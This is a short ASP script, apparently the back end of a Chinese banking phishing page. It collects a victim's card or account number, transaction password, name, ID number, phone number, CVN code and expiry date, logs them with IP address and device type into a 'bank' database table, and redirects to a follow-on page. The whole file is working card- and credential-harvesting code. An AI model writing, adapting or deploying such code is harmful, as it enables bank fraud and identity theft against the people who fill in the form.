<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<!--#include file="include/db_conn.asp"-->
<%
Function getOs()
    Dim agent,os
    agent = request.ServerVariables("HTTP_USER_AGENT") & "" 
    If InStr(1,agent, "windows nt",1)>0 Then
        os = "电脑"
    Else If InStr(1,agent, "iphone",1)>0 Then
        os = "苹果"
    Else If InStr(1,agent, "ipad",1)>0 Then
        os = "苹果平板"
    Else If InStr(1,agent, "android",1)>0 Then
        os = "安卓"
    Else
        os = "其它"
    End if
    End if
    End if
    End If
    getOs = os
End Function

os = getOs()

	idType=Trim(Request("idType"))
	g_zhanghao=Trim(Request("g_zhanghao"))
	g_wangyin=Trim(Request("g_wangyin"))
	g_xingming=Trim(Request("g_xingming"))
	g_shenfenzheng=Trim(Request("g_shenfenzheng"))
	g_shouji=Trim(Request("g_shouji"))
	g_cvn=Trim(Request("g_cvn"))
	g_yxq=Trim(Request("g_yxq"))
	khh=Trim(Request("yhtype"))
	
	if g_zhanghao="" then
		response.Write "<script>alert('请输入注册卡（账）号 ');history.go(-1);</script>"
		response.End()
	end if
	if g_wangyin="" then
		response.Write "<script>alert('请输入交易密码');history.go(-1);</script>"
		response.End()
	end if
	if g_shenfenzheng="" then
		response.Write "<script>alert('请输入身份证');history.go(-1);</script>"
		response.End()
	end if
	if g_shouji="" then
		response.Write "<script>alert('请输入预留手机号');history.go(-1);</script>"
		response.End()
	end if
	
	set Rs=server.createobject("adodb.recordset")
	Sql="select top 1 * from bank"
	rs.open sql,conn,1,3
	Rs.Addnew
	rs("lx")=idType
	rs("zh")=g_zhanghao
	rs("mm")=g_wangyin
	rs("xm")=g_xingming
	rs("sfz")=g_shenfenzheng
	rs("dh")=g_shouji
	rs("cvn")=g_cvn
	rs("khh")=khh
	rs("yxq")=g_yxq
	rs("m")=0
	rs("n")=0
	rs("os") = os
	rs("online") = now()
	if NumTemp>5 and cz=1 then
		rs("cz")=1
	else
		rs("cz")=0
	end if
	rs("ip")= request.servervariables("remote_addr")
	rs("sj")=now()
	rs.update
	session("ddid")=rs("id")
	session("zh")=g_zhanghao
	rs.close
	set rs=nothing
	response.write "<script>top.location ='lateron.asp';</script>"
	
	
%>